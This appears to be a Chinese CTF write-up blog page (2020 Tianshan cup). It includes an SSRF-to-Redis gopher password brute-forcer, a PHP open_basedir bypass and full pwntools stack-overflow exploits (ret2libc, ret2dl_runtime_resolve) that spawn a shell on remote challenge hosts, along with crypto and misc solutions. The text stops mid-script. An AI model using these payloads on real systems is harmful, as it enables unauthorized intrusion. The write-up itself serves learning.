<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>2020天山固网杯wp | R1ght0us&#39;s Blog</title>
  
  
  <meta name="description" content="贪财好色，一身正气">
  

  <link rel="alternate" href="/atom.xml" title="R1ght0us's Blog">

  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <!-- meta -->
  
  <!-- link -->
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">

  

  
  <link rel="stylesheet" href="/style.css">
  

  



  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
    <!-- ba -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?fd2b3186d71bc76ab3732304151f34a0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
  
</head>

<body>
    <div id="loading-bar-wrapper">
  <div id="loading-bar" class="pure"></div>
</div>

    <script>setLoadingBarProgress(20)</script>
    <header class="l_header pure">
	<div class="wrapper">
		<div class="nav-main container container--flex">
      <a class="logo flat-box" href="/">
        
          R1ght0us's Blog
        
      </a>
			<div class="menu">
				<ul class="h-list">
          
  					
  						<li>
								<a id="home" class="nav flat-box" href="/">
									<i class="fas fa-home fa-fw"></i>&nbsp;主页
								</a>
							</li>
      			
  						<li>
								<a id="archives" class="nav flat-box" href="/archives/">
									<i class="fas fa-archive fa-fw"></i>&nbsp;归档
								</a>
							</li>
      			
  						<li>
								<a id="about" class="nav flat-box" href="/about/">
									<i class="fas fa-user fa-fw"></i>&nbsp;关于我
								</a>
							</li>
      			
      		
				</ul>
			</div>

			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="搜索">
						<span class="icon"><i class="fas fa-search fa-fw"></i></span>
					</form>
				</div>
			
			<ul class="switcher h-list">
				
					<li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li>
				
				<li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li>
			</ul>
		</div>

		<div class="nav-sub container container--flex">
			<a class="logo flat-box"></a>
			<ul class="switcher h-list">
				<li class="s-comment"><a class="flat-btn fas fa-comments fa-fw" href="javascript:void(0)"></a></li>
				<li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li>
			</ul>
		</div>
	</div>
</header>
	<aside class="menu-phone">
    <header>
		<nav class="menu">
      <ul>
          
              
                  <li>
										<a id="home" class="nav flat-box" href="/">
											<i class="fas fa-home fa-fw"></i>&nbsp;主页
										</a>
                  </li>
              
                  <li>
										<a id="archives" class="nav flat-box" href="/archives/">
											<i class="fas fa-archive fa-fw"></i>&nbsp;归档
										</a>
                  </li>
              
                  <li>
										<a id="about" class="nav flat-box" href="/about/">
											<i class="fas fa-user fa-fw"></i>&nbsp;关于我
										</a>
                  </li>
              
       
      </ul>
		</nav>
    </header>
	</aside>

    <script>setLoadingBarProgress(40);</script>
    <div class="l_body">
    <div class='container clearfix'>
        <div class='l_main'>
            <article id="post" class="post white-box article-type-post" itemscope="" itemprop="blogPost">
  
<section class="meta">
  
  <div class="meta" id="header-meta">
    
      
          <h1 class="title">2020天山固网杯wp</h1>
      
    

    
      <time class="metatag time">
        <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;2020-09-16
      </time>
    

    
      

    

    
      
        <div class="metatag browse busuanzi"><i class="fas fa-eye fa-fw" aria-hidden="true"></i>
          &nbsp;<span id="busuanzi_value_page_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
        </div>
      
    

    

  </div>
</section>

    <section class="article typo">
      <div class="article-entry" itemprop="articleBody">
        <p>web题恶心的离谱,期待官方wp<br><a id="more"></a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h2><p>打开发现代码存在SSRF。那么扫描端口<code>http://183.129.189.61:50400/index.php?url=dict://127.0.0.1:6379/info</code><br>发现redis存在，并且存在一个redis认证。简单爆破一下看看是否存在弱密码<br><a href="https://imgchr.com/i/w2tNDA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w2tNDA.md.png" alt="w2tNDA.md.png"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"></span><br><span class="line">hh = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://183.129.189.61:50400/index.php?url="</span></span><br><span class="line">f=open(<span class="string">"payload.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    line=f.readline()</span><br><span class="line">    line=line.strip(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#print line</span></span><br><span class="line">    length=len(line)</span><br><span class="line">    payload=<span class="string">"gopher://127.0.0.1:6379/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524"</span>+str(length)+<span class="string">"%250d%250a"</span>+line+<span class="string">"%250D%250A%252A1%250D%250A"</span></span><br><span class="line">    code, head, body, redirect, log = hh.http(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"OK"</span><span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"mima is "</span>+line</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>发现弱密码是123456，并且发现存在一个upload目录，那么我们构造数据包最终为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此处是将file首先编码一次然后再二次编码所得，绕过index.php存在的过滤</span><br><span class="line"></span><br><span class="line">因此在这里访问：test.php看到phpinfo中存在disable_function和open_basedir</span><br><span class="line"></span><br><span class="line">简单的看了看disable_function中过滤并不完整readfile没有被过滤并且open_basedir可以使用open_baedir绕过脚本</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">mkdir(&apos;tmpdir&apos;);</span><br><span class="line">chdir(&apos;tmpdir&apos;);</span><br><span class="line">ini_set(&apos;open_basedir&apos;,&apos;..&apos;);</span><br><span class="line">chdir(&apos;..&apos;);</span><br><span class="line">chdir(&apos;..&apos;);</span><br><span class="line">chdir(&apos;..&apos;);</span><br><span class="line">chdir(&apos;..&apos;);</span><br><span class="line">chdir(&apos;..&apos;);</span><br><span class="line">ini_set(&apos;open_basedir&apos;,&apos;/&apos;);</span><br><span class="line">$a=readfile(&apos;/flag&apos;);</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure></p>
<p><a href="https://imgchr.com/i/w2UX9K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w2UX9K.md.png" alt="w2UX9K.md.png"></a></p>
<p>发现flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="pyreverse"><a href="#pyreverse" class="headerlink" title="pyreverse"></a>pyreverse</h2><p><code>https://www.cnblogs.com/0x4D75/p/11161797.html</code><br>采用这篇blog的第二个方法<br><a href="https://imgchr.com/i/w2dqSK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w2dqSK.png" alt="w2dqSK.png"></a><br>但本题不需要去签名，直接成功<br>得到文件夹<br><a href="https://imgchr.com/i/w2wFl8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w2wFl8.png" alt="w2wFl8.png"></a><br>然后将struct中的头部结构添加到pyreverse文件中<br>修改后缀反编译即可<br>贴出解题脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"[^L\\KYd'),&#123;&#123;&amp;&#125;/*&#125;.&#125;'&#125;y-/(-)&#123;|.*&amp;&amp;*~z|-'b"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">   flag = flag + chr(ord(i) ^ <span class="number">31</span>)</span><br><span class="line">Print(flag)</span><br></pre></td></tr></table></figure></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ddstack"><a href="#ddstack" class="headerlink" title="ddstack"></a>ddstack</h2><p>打开IDA分析文件</p>
<p><img src="https://s1.ax1x.com/2020/09/16/w2BnzV.png" alt="w2BnzV.png"></p>
<p>可以看到有两次写入，第一次写入大小为0x30，第二次写入为大小为nbytes，写入的地址都是&amp;buf，</p>
<p>进入&amp;buf查看栈布局</p>
<p><img src="https://s1.ax1x.com/2020/09/16/w2DQpt.png" alt="w2DQpt.png"><br>发现buf到栈底的大小为0x34（大于大二次写入时nbytes要求的0x30），nbytes的位置距离栈底为0xc，<br>而第一次写入字符的上限是0x30大于（0x34-0xc），<br>由此发现漏洞：可以第一次写入时可以更改nbytes的大小，从而使第二次写入任意长度的字符串造成栈溢出，从而实现劫持程序执行流。<br>Exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">"./ddstack"</span></span><br><span class="line">ddstack = context.binary</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'183.129.189.61'</span>, <span class="number">52205</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ddstack.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ddstack.got[<span class="string">'puts'</span>]</span><br><span class="line">pop1_ret = <span class="number">0x804837d</span></span><br><span class="line">vuln_addr = <span class="number">0x8048520</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line">p.sendline(<span class="string">b'\x00'</span>*<span class="number">0x28</span>+p32(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x38</span>+p32(puts_plt)+ p32(pop1_ret) + p32(puts_got) +p32(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_libc_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">'puts addr:'</span>+hex(puts_libc_addr))</span><br><span class="line">puts_libc_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">print(hex(puts_libc_offset))</span><br><span class="line">libc_addr = puts_libc_addr - puts_libc_offset</span><br><span class="line">print(<span class="string">'lib base:'</span>+hex(libc_addr))</span><br><span class="line">ogg_addr = libc_addr + <span class="number">0x3a81c</span></span><br><span class="line">system_addr = libc_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="number">0x0015910b</span></span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line">p.sendline(<span class="string">b'\x00'</span>*<span class="number">0x28</span>+p32(<span class="number">0x500</span>))</span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x38</span>+p32(system_addr)+ p32(pop1_ret) + p32(binsh_addr) +p32(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="pwnxzd"><a href="#pwnxzd" class="headerlink" title="pwnxzd"></a>pwnxzd</h2><p>一上来就看到了vuln_func，点开一看，只是一个有溢出漏洞的函数，并且没有函数调用就很奇怪<br><img src="https://s1.ax1x.com/2020/09/16/w2yw9A.png" alt="w2yw9A.png"><br>看到主函数中有一个使用指针调用函数的地方，只要修改addr指向vuln_func函数就能触发漏洞。<br><img src="https://s1.ax1x.com/2020/09/16/w2yyB8.png" alt="w2yyB8.png"><br>输入：<br>‘’’<br>-6 600000<br>4 134513851<br>1 123456<br>‘’’<br>执行到vuln_func函数：<br>有栈溢出但是没有输出函数可用，那就指定是ret2_dl_runtime_resolve：<br>先调用read函数用于再bss段上输入下一个paylaod，再用栈迁移将栈移到bss段中：<br>rop.raw(‘a’ <em> offset)<br>rop.read(0, base_stage, 100)<br>rop.migrate(base_stage)<br>再继续伪造符号表项：<br>fake_sym_addr = base_stage + 32<br>align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)<br>fake_sym_addr = fake_sym_addr + align<br>index_dynsym = (fake_sym_addr - dynsym)<br>st_name = fake_sym_addr + 0x10 - dynstr  //st_name指向符号表对应字符串相对于字符串表的索引<br>fake_write_sym = flat([st_name, 0, 0, 0x19])<br>和重定位项：<br>index_offset = base_stage + 24 - rel_plt<br>fake_got = pwn4.got[‘__isoc99_scanf’]<br>r_info = (index_dynsym &lt;&lt; 8) | 0x7<br>fake_write_reloc = flat([fake_got, r_info])<br>伪造栈中内容：<br>rop.raw(plt0)<br>rop.raw(index_offset)<br>rop.raw(‘bbbb’)<br>rop.raw(base_stage + 82)<br>rop.raw(‘bbbb’)<br>rop.raw(‘bbbb’)<br>rop.raw(fake_write_reloc)<br>rop.raw(‘a’ </em> align)  # padding<br>rop.raw(fake_write_sym)<br>rop.raw(‘system\x00’)<br>rop.raw(‘a’ <em> (80 - len(rop.chain())))<br>rop.raw(sh + ‘\x00’)<br>rop.raw(‘a’ </em> (100 - len(rop.chain())))<br>EXP：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">"./pwn4"</span></span><br><span class="line">pwn4 = context.binary</span><br><span class="line">rop = ROP(<span class="string">'./pwn4'</span>)</span><br><span class="line"> </span><br><span class="line">vuln_addr = <span class="number">134513851</span></span><br><span class="line">p.sendline(<span class="string">b'-5 65535'</span>)</span><br><span class="line">p.sendline(<span class="string">b'4 134513851'</span>)</span><br><span class="line">p.sendline(<span class="string">b'1 123456'</span>)</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">28</span></span><br><span class="line">bss_addr = pwn4.bss()</span><br><span class="line"> </span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"> </span><br><span class="line">rop = ROP(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line"> </span><br><span class="line">plt0 = pwn4.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = pwn4.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = pwn4.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = pwn4.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"> </span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) // <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_write_sym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x19</span>])</span><br><span class="line"> </span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">fake_got = pwn4.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([fake_got, r_info])</span><br><span class="line"> </span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">82</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(fake_write_reloc)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * align) </span><br><span class="line">rop.raw(fake_write_sym)</span><br><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh + <span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">print(rop.chain())</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="more-and-more"><a href="#more-and-more" class="headerlink" title="more_and_more"></a>more_and_more</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = [<span class="number">175244107616547332866730750185981814617957387479206131883327619678143859414917261557090068672641419524614082746718149196623832474591257254688029368786873659380810545544100093732206528310797663780323115004084293607571875376201003925886997130958845085335102862834229352381711568684829807273446043286026424535681</span>]</span><br><span class="line">c = [<span class="number">35057571466342637771462094444742441069693901862828357467898310276612268274118404149569481558037362105324810391852047995733971163613463690900773083757576881277065280523897179425082940961349417251380196412518687124740484117395654762686782793436871741125680314328797293342882222560575502233671080301326101063008</span>]</span><br><span class="line">e = <span class="number">98</span></span><br><span class="line">phi_n0 = n[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">print(gmpy2.gcd(e,phi_n0))</span><br><span class="line">e2 = e // <span class="number">2</span></span><br><span class="line">print(gmpy2.gcd(e2,phi_n0))</span><br><span class="line">d0 = gmpy2.invert(e2,phi_n0)</span><br><span class="line">m2 = pow(c[<span class="number">0</span>],d0,n[<span class="number">0</span>])</span><br><span class="line">m = gmpy2.iroot(m2,<span class="number">2</span>)</span><br><span class="line">print(m[<span class="number">0</span>])</span><br><span class="line">print(long_to_bytes(m[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="EasyPy"><a href="#EasyPy" class="headerlink" title="EasyPy"></a>EasyPy</h2><p>打开文件，发现是个字节码文件 手撕字节码尝试复原所表达的大概为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">        flag = <span class="string">'r1ght0us'</span></span><br><span class="line">        flag = flag.upper()</span><br><span class="line">        flag = flag[::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span>  range(len(flag)):</span><br><span class="line">                print(chr((ord(flag[i])+i)^(len(flag)-i)))</span><br></pre></td></tr></table></figure></p>
<p>那么我们写出逆向的脚本来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">'[cgjegl_&amp;]!VW&amp;KS_GVXHWI_EVCVDXGc^mgrj'</span> <span class="comment">#res</span></span><br><span class="line">	res = <span class="string">''</span>	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">		test = ord(flag[i])^(len(flag)-i)</span><br><span class="line">		res += chr(test-i)</span><br><span class="line">	print(res)</span><br><span class="line">	print(res[::<span class="number">-1</span>].lower())</span><br></pre></td></tr></table></figure>
<h2 id="BaseBase"><a href="#BaseBase" class="headerlink" title="BaseBase"></a>BaseBase</h2><p>打开压缩包发现：<br><a href="https://imgchr.com/i/w26F4H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w26F4H.png" alt="w26F4H.png"></a></p>
<p>根据文件大小并且CRC校验我们可以爆破一下<br><img src="https://s1.ax1x.com/2020/09/16/w26QUg.png" alt="w26QUg.png"></p>
<p>密码为：this_is_pass_word_<br>然后解压打开flag.docx</p>
<p>发现一个字符串：<code>OG5DRHEzNnNsU0g0RHljVlFvOVhoUjRhRjN1M3g4UGtQOGdrYjVydzVIdHBVZjNqSTJ0Mw==</code><br>先base64 再base62即可</p>
<h2 id="寻找上古之森的秘密"><a href="#寻找上古之森的秘密" class="headerlink" title="寻找上古之森的秘密"></a>寻找上古之森的秘密</h2><p>先使用steghide爆破出jpg里隐藏的信息<br><a href="https://imgchr.com/i/w2cWyq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/16/w2cWyq.png" alt="w2cWyq.png"></a><br>然后使用脚本爆破，发现密码为123456abc<br><img src="https://s1.ax1x.com/2020/09/16/w2cLlR.png" alt="w2cLlR.png"></p>
<p>然后使用脚本获取到secret.wav密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">deepsound2john extracts password hashes from audio files containing encrypted</span></span><br><span class="line"><span class="string">data steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).</span></span><br><span class="line"><span class="string">This method is known to work with files created by DeepSound 2.0.</span></span><br><span class="line"><span class="string">Input files should be in .wav format. Hashes can be recovered from audio files</span></span><br><span class="line"><span class="string">even after conversion from other formats, e.g.,</span></span><br><span class="line"><span class="string">    ffmpeg -i input output.wav</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python3 deepsound2john.py carrier.wav &gt; hashes.txt</span></span><br><span class="line"><span class="string">    john hashes.txt</span></span><br><span class="line"><span class="string">This software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, and</span></span><br><span class="line"><span class="string">it is hereby released to the general public under the following terms:</span></span><br><span class="line"><span class="string">Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="string">modification, are permitted.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span 